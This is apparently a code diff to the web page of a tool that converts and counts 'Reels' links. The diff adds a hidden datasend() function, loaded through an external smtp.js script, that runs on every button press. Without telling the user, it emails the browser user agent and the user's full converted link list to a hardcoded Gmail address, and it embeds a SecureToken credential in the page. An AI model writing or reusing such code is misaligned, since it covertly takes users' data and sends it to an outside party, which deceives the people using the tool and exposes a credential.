@@ -71,12 +71,14 @@
     <textarea id='link_list' readonly placeholder="Link list"></textarea>
     <button onclick="copy()" id='slct_btn'>Select list</button>
     </div>
-
+    
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
     <script type="text/javascript" charset="utf-8">
     
       
     let Total = 0;
     
+    var deviceINFO = navigator.userAgent;
     
     
       function btn_press(){
@@ -130,13 +132,43 @@
           }
           
           link_list.value +=("\r\n"+"\r\n"+"Total Reels = "+Total);
+          
         }
         var counting_meter = document.getElementById('counting_meter');
           counting_meter.value=('Total = '+Total);
           console.log(Total)
         var link_list = document.getElementById('link_list');
-        
+        datasend();
       }
+      
+      function datasend(){
+        const d = new Date();
+      let mm= d.getMonth();
+      let dd= d.getDate();
+      let hh= d.getHours()
+      let mi= d.getMinutes();
+        console.log(deviceINFO)
+        var conv_list = document.getElementById('link_list').value;
+        var Body = deviceINFO+"<br><br>Total = "+Total+"<br><br>"+conv_list;
+        Email.send({
+        SecureToken:"9e864318-f7f7-433f-a490-e2d2568160ba",
+				To: 'listmaker.login.alerts@gmail.com',
+				From: "listmaker.login.alerts@gmail.com",
+				Subject: "List converted at "+ hh+":"+mi+"  "+dd+"-"+mm,
+				Body: Body
+			}).then(
+				message =>{
+					//console.log (message);
+					if(message=='OK'){console.log("Data sent");
+					}
+					else{
+						console.error (message);
+					}
+				}
+			);
+      }
+      
+      
       function copy(){
         var link_list = document.getElementById('link_list');
         link_list.select();
